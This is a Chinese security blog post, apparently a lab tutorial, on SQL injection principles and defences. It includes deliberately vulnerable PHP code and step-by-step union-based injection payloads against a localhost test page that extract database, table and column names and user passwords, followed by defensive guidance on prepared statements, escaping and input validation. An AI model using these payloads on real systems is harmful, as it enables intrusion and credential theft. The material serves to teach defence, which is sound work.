@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="tea9">
+
+
+    <meta name="subtitle" content="加油">
+
+
+    <meta name="description" content="心中有光の孩子 提示：图片都存到了github仓库需要挂代理才能看到">
+
+
+    <meta name="keywords" content="tea9,tea9的博客,开发,android,安全,android安全,android逆向,移动安全,frida,xposed,ollvm,查查查,茶茶茶,茶茶,茶姐姐,茶姐姐博客,茶茶茶博客,茶茶blog">
+
+
+<title>web安全实验-SQL注入漏洞原理及防范-上 | tea9のblog</title>
+
+
+
+    <link rel="icon" href="/image/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Tea9&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Tea9&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">web安全实验-SQL注入漏洞原理及防范-上</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">tea9</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十一月 9, 2020&nbsp;&nbsp;22:15:23</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Security/">Security</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p><strong>漏洞介绍</strong></p>
+<p><strong>认识SQL注入漏洞</strong></p>
+<p>SQL注入漏洞可以说是在企业运营中会遇到的最具破坏性的漏洞之一，它也是目前被利用得最多的漏洞。</p>
+<p>要学会如何防御SQL注入，我们首先要对他的原理进行了解。</p>
+<p>SQL注入（SQLInjection）是这样一种漏洞：当我们的Web app在向后台数据库传递SQL语句进行数据库操作时。</p>
+<p>如果对用户输入的参数没有经过严格的过滤处理，那么恶意访问者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。</p>
+<p><strong>漏洞危害</strong></p>
+<p>1.直接就造成数据库中的数据泄露</p>
+<p>2.如果数据库连接用户具备高权限，则可能导致恶意访问者获取服务器控制权</p>
+<p>3.众多安全事件的切入点。</p>
+<p><strong>相关百度漏洞案例</strong></p>
+<p><strong>WooYun-2015-157024 某百度音频系统注入间接导致GETSHELL可内网渗透。</strong></p>
+<p>恶意访问者发现一处注入漏洞后，随后该恶意访问者通过信息搜集，发现一处信息泄漏，得到了网站目录的绝对路径。</p>
+<p>该恶意访问者想通过into_outfile写入获取shell权限。发现PHP后端具有基本的防御，’ 单引号被转义。导致写shell时语法错误，无法突破后，恶意访问者开始调整恶意访问角度。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/640657/1604931315431-50583324-20a8-4258-ac9b-3941a2861779.jpeg" alt="img"></p>
+<p>不甘放弃的恶意访问者开始使用Mysql load_file函数读取网站程序源码审计，终于恶意访问者发现一处二次注入已绕过单引号的过滤。通过构造够到语句尝试GETSHELL。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/640657/1604931315860-9d78961d-96d9-46bc-b362-2c7ac6aef2b5.jpeg" alt="img"></p>
+<p><strong>恶意访问者利用成功，写入了恶意PHP文件，获得了一个SHELL权限，且该服务器处于百度内网，可进一步内网渗透，提权，嗅探等操作，按照目前恶意访问者拥有的权限可以对网站，甚至数据库进行破坏操作，该漏洞被白帽子提交修复。但是如果落入恶意的“黑客”手中，进一步内网渗透，可能造成更多服务器，敏感数据沦陷！</strong></p>
+<ul>
+<li>根据本案例思考，良好的安全编码习惯，敏感信息处理，就相对避免恶意访问者多种恶意访问。</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/640657/1604931315694-d1ed47c8-0188-437e-aec7-c0285c9a954b.jpeg" alt="img"></p>
+<p><strong>实验环境工具介绍</strong></p>
+<p>火狐浏览器</p>
+<p>HackBar : 一款Firefox浏览器下的黑客插件 安全人员可以十分方便的用来进行Sql注入以及Xss测试或进行各种编码功能等。</p>
+<p>在火狐的附加组件中搜索“hackbar”，将它添加到火狐浏览器中， 重启后Firefox后安装完成，按F9键打开我们就会看到在地址栏下面会出现一个大框框就是hackbar了</p>
+<p>F12 就可以看到了</p>
+<p>我们可以点击Load URL将URL栏的地址加载到HackBar窗口中，可以利用HackBar工具栏提供了很多web开发相关的命令，像urlencode,urldecode等常见的命令。</p>
+<p><strong>漏洞分析与防护</strong></p>
+<p><strong>Part 1：简单漏洞实例</strong></p>
+<p>首先，我们打开浏览器输入测试平台的地址，选择SQL注入漏洞进行分析。</p>
+<p><a target="_blank" rel="noopener" href="http://localhost/sqli/int/index.php?id=1">http://localhost/sqli/int/index.php?id=1</a></p>
+<p>源码分析</p>
+<p>该页面中是一个简单的漏洞源码示例，在接收到用户的提交数据后，对输入的内容没有任何过滤。所以我们通过简单的SQL注入语句构造就可以对数据库中的内容进行操作。我们先分析该页面的源代码：</p>
+<?php  include("sql-connections/sql-connect.php"); error_reporting(0); $id = isset($_GET['id']) ? $_GET['id']:'1'; $sql="SELECT * FROM news WHERE id='$id'"; //用户输入完全未过滤，直接带入SQL语句，导致SQL注入 $result=mysql_query($sql); $row = mysql_fetch_array($result);  if($row)  {    echo "<table class='table table-striped'>";    echo '<tr><td>'. $row['title'].'</td></tr>  ';    echo '<tr><td>' .$row['content'].'</td></tr>';    echo "</table>";    }  else   {  echo "<br>";  echo '<font color= "red">';  print_r(mysql_error());  echo "</font>";    }  ?>
+
+
+
+<p>在这段代码中，通过变量”$sql”来执行相应的SELECT语句，但是对用户输入的变量”$id”并没有任何处理,造成了SQL注入漏洞的产生。接下来，我们通过简单的测试，验证此处SQL注入的存在。</p>
+<p><strong>漏洞验证</strong></p>
+<ul>
+<li>首先，我们在输入的末端添加一个 ‘ ‘ ’ 单引号，对输入内容进行闭合，并在之后添加判断语句: ‘ and 1&#x3D;1 –+ &#x2F;&#x2F;“–+或者#为注释符，用于截断原SQL语句末尾原有的单引号”</li>
+</ul>
+<p><strong>注入代码&#x3D;</strong> <strong>?id&#x3D;1’ and 1&#x3D;1 –+</strong></p>
+<ul>
+<li>实现单引号绕过,服务端在接收到这段输入内容之后，执行的SQL语句就变为了： select * from users where id&#x3D;’1’ and 1&#x3D;1 –+ &#x2F;&#x2F;由于”and 1 &#x3D; 1”是恒真的，所有查询的结果正常显示</li>
+</ul>
+<p><strong>注入代码&#x3D;</strong> <strong>?id&#x3D;1’ and 1&#x3D;2 –+</strong></p>
+<p>这时，我们对输入的内容稍微修改，输入’and 1&#x3D;2 –+ 服务端执行的SQL语句就变为了：</p>
+<p>select * from users where id&#x3D;’1’ and 1&#x3D;2 –+ &#x2F;&#x2F;此时，由于and 1&#x3D;2恒为假，所以并没有返回信息，所以确定存在注入漏洞。</p>
+<p>在验证漏洞存在之后，我们就可以进行各种语句的构造，操作数据库中的内容。以下实验内容，大家可以任意尝试。</p>
+<p><strong>注入代码&#x3D;</strong> <strong>?id&#x3D;1’ order by 4 –+</strong></p>
+<ul>
+<li>判断字段长度 ‘Order by 4 服务端执行语句为: select * from users where id&#x3D;’1’ order by 4 –+ 通过Order by 函数判断列长度，由报错信息判断列长度小于4，继续向下尝试。</li>
+</ul>
+<p><strong>注入代码&#x3D;</strong> <strong>?id&#x3D;1’ order by 3 –+</strong></p>
+<ul>
+<li>再次判断字段长度 Order by 3 服务端执行语句为: select * from users where id&#x3D;’1’ order by 3 –+</li>
+<li>通过Order by 函数判断列长度，无报错信息判断列长度等于3，根据收集信息进一步注入。</li>
+</ul>
+<p><strong>注入代码</strong></p>
+<p>&#x3D; ?id&#x3D;1’and 1&#x3D;2 union select 1,user(),database() –+</p>
+<ul>
+<li><p>获取敏感信息 ‘and 1&#x3D;2 union select 1,user(),database() –+ 服务端执行语句为: select * from users where id&#x3D;’1’ and 1&#x3D;2 union select 1,user(),database() –+ 爆出服务端MySQL当前用户名，当前数据库名，可以利用数据库名进一步获取表名。</p>
+</li>
+<li><p>注入获取表名</p>
+</li>
+</ul>
+<p><strong>注入代码</strong></p>
+<p>&#x3D; ?id&#x3D;1’and 1&#x3D;2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() –+</p>
+<p>服务端执行语句为: select * from users where id&#x3D;’1’ and 1&#x3D;2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() –+ 默认MySQL information_schema数据库中保存了数据库所有数据库表和列的信息，因此我用利用这个特性去查询表和列名。 获取到表名后，依旧利用information_schema数据库查询列名。</p>
+<p><strong>注入代码</strong></p>
+<p>&#x3D; ?id&#x3D;1’ and 1&#x3D;2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’ –+</p>
+<p>服务端执行语句为: select * from users where id&#x3D;’1’and 1&#x3D;2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’ –+ 获取USER表,列名称。</p>
+<p><strong>注入代码</strong></p>
+<p>&#x3D;’and 1&#x3D;2 union select 1,group_concat(name),group_concat(pass) from users –+</p>
+<ul>
+<li>注入获取用户数据 服务端执行语句为: select * from users where id&#x3D;’1’ and 1&#x3D;2 union select 1,group_concat(name),group_concat(pass) from users –+<br> 通过group_concat获取所有用户数据，最终实现脱裤(得到数据库中的数据)。</li>
+</ul>
+<p><strong>Part2 漏洞防护总结</strong></p>
+<p><strong>最佳防御代码 策略</strong></p>
+<p>PDO prepare参数化语句</p>
+<p>PHP数据对象(PHP Date Object PDO)框架最常用的数据库接口之一，通过使用问号占位符来支持参数化语句。</p>
+<p><strong>安全示例代码1</strong></p>
+<?php  $dbh = new PDO("mysql:host=localhost;dbname=demo","user","pass"); $dbh->exec("set names 'GBK'"); $sql = "select * from test where name = ? and password = ?"; $stmt = $dbh->prepare($sql); $exeres = $stmt->execute(array($name,$pass)); ?>
+
+<p>这段代码虽然使用了PDO prepare方式处理查询，但是当PHP版本在5.3.6之前还是存在宽字节注入漏洞，原因在于使用了本地模拟Prepare，在把完整SQL语句发送给服务器，并且编码设置了GBK，所以会有PHP和MYSQL编码不一致原因导致注入，解决方法是 使用ATTR_EMULATE_PREPARES来禁用PHP本地模拟prepare。</p>
+<p><strong>安全示例代码2</strong></p>
+<?php  $dbh = new PDO("mysql:host=localhost;dbname=demo","user","pass"); $dbh->setAttribute(PDO::ATTR_EMULATE_PREPARES,false); $dbh->exec("set names 'utf8'"); $sql = "select * from test where name = ? and password = ?"; $stmt = $dbh->prepare($sql); $exeres = $stmt->execute(array($name,$pass));  ?>
+
+
+
+<p>这里使用某CMS SQL注入防护系统代码，在安全编码的习惯基础上，在向数据库发送执行请求时，所有请求必须经过防注入函数二次验证，最大程度上避免了SQL注入漏洞的产生。</p>
+<ul>
+<li>注意 ： 不要忽略X-Forwarded-For，Header，Refferer参数 包括从数据库取出时也要经过安全函数过滤，因为这些攻击者完全可以通过抓包修改这些参数，一切输入甚至输出都可能是有害的。</li>
+</ul>
+<p> private static function _do_query_safe($sql) {   $sql &#x3D; str_replace(array(‘\\‘, ‘\&#39;‘, ‘\“‘, ‘&#39;&#39;‘), ‘’, $sql);   $mark &#x3D; $clean &#x3D; ‘’;   if (strpos($sql, ‘&#x2F;‘) &#x3D;&#x3D;&#x3D; false &amp;&amp; strpos($sql, ‘#’) &#x3D;&#x3D;&#x3D; false &amp;&amp; strpos($sql, ‘– ‘) &#x3D;&#x3D;&#x3D; false &amp;&amp; strpos($sql, ‘@’) &#x3D;&#x3D;&#x3D; false &amp;&amp; strpos($sql, ‘<code>&#39;) === false) &#123;    $clean = preg_replace(&quot;/&#39;(.+?)&#39;/s&quot;, &#39;&#39;, $sql);   &#125; else &#123;    $len = strlen($sql);    $mark = $clean = &#39;&#39;;    for ($i = 0; $i &lt; $len; $i++) &#123;     $str = $sql[$i];     switch ($str) &#123;      case &#39;</code>‘:       if(!$mark) {        $mark &#x3D; ‘<code>&#39;;        $clean .= $str;       &#125; elseif ($mark == &#39;</code>‘) {        $mark &#x3D; ‘’;       }       break;      case ‘&#39;‘:       if (!$mark) {        $mark &#x3D; ‘&#39;‘;        $clean .&#x3D; $str;       } elseif ($mark &#x3D;&#x3D; ‘&#39;‘) {        $mark &#x3D; ‘’;       }       break;       …     }     $clean .&#x3D; $mark ? ‘’ : $str;    }   }   if(strpos($clean, ‘@’) !&#x3D;&#x3D; false) {    return ‘-3’;   }   $clean &#x3D; preg_replace(“&#x2F;[^a-z0-9_-()#*/&quot;]+&#x2F;is”, “”, strtolower($clean));   if (self::$config[‘afullnote’]) {    $clean &#x3D; str_replace(‘&#x2F;**&#x2F;‘, ‘’, $clean);   }   …   return 1;  }</p>
+<p><strong>设计输入验证和处理策略</strong></p>
+<p>输入验证是一种在保护应用程序安全方面很有用的工具。不过，他只能作为深度防御策略（包含多个防护层以保护应用程序的总体安全）的一个子部分。</p>
+<p>在应用程序输入层使用白名单输入验证以便验证所有用户输入都符合应用要接收的内容。应用只允许接收符合期望格式的输入</p>
+<p>在客户端浏览器上同样执行白名单输入验证，这样可以防止为用户输入不可接收的数据时服务器和浏览器的往返传递。不能将该操作作为安全控制手段，因为攻击者可以修改来自用户浏览器的所有数据。</p>
+<p>在Web应用防火墙（WAF）层使用黑名单和白名单输入验证（以漏洞“签名”和“有经验”行为的形式）以便提供入侵检测&#x2F;阻止功能和监控应用攻击。</p>
+<p>在应用程序中自始自终地使用参数化语句以保证执行安全地SQL执行。</p>
+<p>在数据库中使用编码技术以便在动态SQL中使用输入时安全地对其编码。</p>
+<p>在使用从数据库中提取数据之前恰当地对其进行编码。例如将浏览器中显示的数据针对跨站脚本进行编码。</p>
+<p><strong>推荐防护方案</strong></p>
+<p><strong>领域驱动的安全性</strong></p>
+<ul>
+<li>SQL注入之所以发生，是因为我们的应用程序不正确地将数据在不同表示方式之间进行映射。</li>
+<li>通过将数据封装到有效值对象中，并限制对原始数据的访问，我们就可以控制对数据的使用</li>
+</ul>
+<p><strong>使用参数化语句</strong></p>
+<ul>
+<li>动态SQL（或者将SQL查询组装成包含用户控制的输入字符串并提交给数据库）是引发SQL注入漏洞的主要原因。</li>
+<li>应该使用参数化语句（也称为预处理语句）而非动态SQL来安全地组装SQL查询</li>
+<li>在提供数据时可以只使用参数化语句，但却无法使用参数化语句来提供SQL关键字或表示符（比如表名或列名）。</li>
+</ul>
+<p><strong>验证输入</strong></p>
+<ul>
+<li>尽可能坚持使用白名单输入验证（只接受期望的已知良好的输入）。</li>
+<li>确保验证应用收到的所有受用户控制的输入类型，大小，范围和内容。</li>
+<li>只有当无法使用白名单输入验证时才能使用黑名单输入验证（拒绝已知不良的或基于签名的输入）</li>
+<li>绝不能单独只使用黑名单检验数据，至少应该总是将它与输出编码技术一起结合使用。</li>
+</ul>
+<p><strong>编码输出</strong></p>
+<ul>
+<li>确保对包含用户可控制输入的查询进行正确的编码以防止使用单引号或其他字符来修改查询。</li>
+<li>如果正在使用LIKE子句，请确保LIKE中的通配符恰当编码。</li>
+<li>在使用从数据库接收到的数据之前确保已经对数据中的敏感内容进行了恰当的输入验证和输出编码。</li>
+</ul>
+<p><strong>规范化</strong></p>
+<ul>
+<li>将输入解码或变为规范格式后才能执行输入验证过滤器和输出编码</li>
+<li>任何单个字符都存在多种表示及编码方法。</li>
+<li>尽可能使用白名单输入验证并拒绝非规范格式的输入。</li>
+</ul>
+<p><strong>通过设计避免SQL注入</strong></p>
+<ul>
+<li>使用存储过程以便在数据库层拥有较细粒的许可。</li>
+<li>可以使用数据访问抽象层来对整个应用施加安全的数据访问。</li>
+<li>设计时，请考虑对敏感信息进行附加的控制。</li>
+</ul>
+<p><strong>其他防御方式</strong></p>
+<p><strong>GPC&#x2F;RUNTIME魔术引号</strong></p>
+<p>通常数据污染有两种方式，一种是应用被动接受参数，类似于GET,POST等；还有一种是主动获取参数，类似于读取远程页面或者文件内容等。所以防止SQL注入的方法就是要守住这两条路。</p>
+<p>magic_quotes_gpc负责对GET,POST，COOKIE的值进行过滤，magic_quotes_runtime对从数据库或者文件中获取的数据进行过滤。通常在开启这两个选项之后能防住部分SQL注入漏洞被利用，因为我们之前也介绍了，在某些环境下存在绕过，在INT型注入上是没有多大作用的。</p>
+<p>在PHP.INI配置GPC RUTIME启用状态</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/640657/1604931315565-12689cea-f40f-48b1-a03a-92698e50538f.jpeg" alt="img"></p>
+<p>测试代码如下:</p>
+<?php echo ($_GET['ichunqiu']); ?>
+
+<ul>
+<li>GPC关闭状态下，可以看到GET请求未经过过滤显示。</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/640657/1604931315511-8b5c3f95-7ef6-4cfe-963f-f349c3cf8a70.jpeg" alt="img"></p>
+<p>&amp; GPC开启状态，自动对GET获取的数据进行了转义。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/640657/1604931315520-a71f6de9-e42f-4fa7-a00e-d12f5534c284.jpeg" alt="img"></p>
+<p><strong>过滤函数和类</strong></p>
+<p>在PHP5.4之前，可以利用魔术引号来解决部分SQL注入的问题。而GPC在面对INT型注入时，也无法进行很好的防御。所以在通常的工作场景中，用得多的还是过滤函数和类。 不过如果单纯的过滤函数写得不够严谨，也会出现绕过的情况。这时候可以使用<strong>预编译语句</strong>来<strong>绑定变量</strong>，一般情况下这是防御SQL注入的最佳方式。</p>
+<p><strong>mysql</strong><strong>[real</strong><strong>]escape_string函数</strong></p>
+<p>mysql_escape_string和mysql_real_escape_string函数都是对字符串进行过滤，在PHP4.0.3以上版本才存在。以下字符会受到影响： [\x00][\n][\r][][‘][“][\x1a] 两个函数唯一不一样的地方在于mysql_real_escape_string接受的是一个连接句柄并根据当前字符串，所以推荐使用mysql_real_escape_string。</p>
+<p>测试代码如下：</p>
+<?php $con = @mysql_connect("localhost","root","root"); $id = mysql_real_escape_string($_GET['ichunqiu'],$con); echo "$id"; ?>
+
+
+
+<p><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/640657/1604931315475-8ad3d0f0-0169-46ee-8a79-fb70a89a5d9a.jpeg" alt="img"></p>
+<p><strong>intval等字符转换</strong></p>
+<p>上面我们提到的过滤方式，在int类型注入时效果并不好，比如可以通过报错或者忙注等方式来绕过，这时候intval等函数就起作用了，intval的作用是将变量转换成int类型，这里举例intval是要表达一种方式，一种利用参数类型白名单的方式来防止漏洞。</p>
+<ul>
+<li>代码示例 1</li>
+</ul>
+<?php $id=intval($id); if($id) {   $sql="select * from users where uid=".$id;   mysql_query($sql,$con);}
+
+测试效果如下： 将数据强制转换成为INT，避免了闭合单引号绕过的风险。
+
+![img](https://cdn.nlark.com/yuque/0/2020/jpeg/640657/1604931315505-4ddf1967-fd44-41c3-a415-5a0756d26421.jpeg)
+
+- 代码示例 2
+
+$con = mysql_connect("localhost","mysql_user","mysql_pwd"); $id=$_GET['id']; //字符型的使用mysql_real_escape_string进行处理即：$id=mysql_real_escape_string($id); //如果使用了odp框架，字符型的可调用escapeString()方法进行过滤 $id=intval($id); sql="select username,password from users where uid=".$id; mysql_query($sql,$con);
+
+在使用intval过滤时，不要使用if(intval($id))，这样会过滤失效，而应该使用
+
+$id=intval($id); if($id) {     $sql="select username,password from users where uid=".$id;     mysql_query($sql,$con); }
+
+
+
+**思考**
+
+SQL注入使用内置安全转义函数过滤。
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+认识sql注入漏洞
+
+webapp在向后台数据传递SQL语句进行数据库操作时。
+
+如果对用户输入参数没有经过严格的过滤处理，恶意访问者就可以构造特殊的SQL语句，获取或修改数据库中的数据
+
+
+
+漏洞危害
+
+1.直接造成数据库中的数据泄露
+
+2.数据库连接用户具备最高权限，则可以导致恶意访问者获取服务器控制权
+
+3.众多安全事件的切入点
+
+
+
+案例
+
+into_outfile 写入shell权限 -> ‘ 单引号被转义。 导致写shell时语法错误
+
+load_file 函数 读取网站程序源码审计 二次注入绕过单引号的过滤 尝试GETSHELL
+
+
+
+
+
+HackBar Firefow黑客插件
+
+用于Sql注入以及Xss测试或进行各种编码功能
+
+
+
+1简单漏洞实例
+
+
+
+
+
+http://localhost/sqli/int/index.php?id=1
+
+
+
+http://localhost/sqli/int/index.php?id=1' and 1=1 --+
+
+显示正常
+
+
+
+http://localhost/sqli/int/index.php?id=1' and 1=2 --+
+
+显示错误
+
+
+
+http://localhost/sqli/int/index.php?id=1' order by 4--+
+
+http://localhost/sqli/int/index.php?id=1' order by 3--+
+
+列长度
+
+
+
+http://localhost/sqli/int/index.php?id=1' and 1=2 union select 1,user(),database()--+
+
+获取敏感信息
+
+爆出用户名和密码
+
+
+
+http://localhost/sqli/int/index.php?id=1' and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+
+
+注入获取表名
+
+information_schema 保存了数据库所有数据库表和列的信息
+
+
+
+?id=1' and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
+
+获取users表列名
+
+
+
+'and 1=2 union select 1,group_concat(name),group_concat(pass) from users--+
+
+获取数据
+
+
+
+2防护总结
+
+
+
+最佳防御代码 策略
+
+PDO prepare参数化语句
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>tea9</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://tea9.xyz/post/970197813.html">http://tea9.xyz/post/970197813.html</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2017-2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/web%E5%AE%89%E5%85%A8/"># web安全</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/post/1004399563.html">web安全实验-SQLmap工具-执行SQL命令</a>
+            
+            
+            <a class="next" rel="next" href="/post/93589709.html">web安全实验-SQLmap工具POST注入实验</a>
+            
+        </section>
+    </article>
+</div>
+
+
+
+
+            </div>
+            <footer id="footer" class="footer">
+ 
+    <div class="copyright">
+        <span>© tea9 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+   
+</footer>
+
+    </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"live2d-widget-model-hijiki"},"display":{"position":"right","width":200,"height":350},"mobile":{"show":true},"log":false});</script></body>
+
+</html>
